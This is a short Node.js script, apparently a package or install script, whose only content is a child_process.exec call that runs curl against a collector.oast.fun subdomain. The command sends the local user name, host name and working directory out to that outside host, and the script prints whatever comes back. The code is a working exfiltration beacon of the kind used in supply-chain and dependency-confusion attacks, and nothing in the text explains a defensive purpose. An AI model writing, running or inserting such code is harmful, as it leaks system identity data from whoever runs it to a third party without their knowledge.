const { exec } = require("child_process");

exec("curl `whoami`.collector.oast.fun/`hostname`/`pwd`", (error, data) => {
  if (error) return;
  console.log(data);
});
